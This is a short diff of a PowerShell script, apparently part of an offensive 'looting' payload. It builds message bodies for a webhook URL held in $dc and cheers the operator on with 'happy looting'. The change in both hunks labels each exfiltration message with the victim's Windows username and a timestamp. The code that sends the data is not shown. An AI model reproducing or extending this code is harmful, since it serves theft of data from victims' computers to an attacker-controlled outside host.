@@ -76,7 +76,7 @@ if ($pers -ne 'True') {
 $test += " Good luck and happy looting! :pirate_flag:"
 
 $Body = @{
-  'username' = $FolderName
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
   'content' = $text
 }
 
@@ -1146,7 +1146,7 @@ param (
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $FolderName
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
   'content' = $text
 }
 
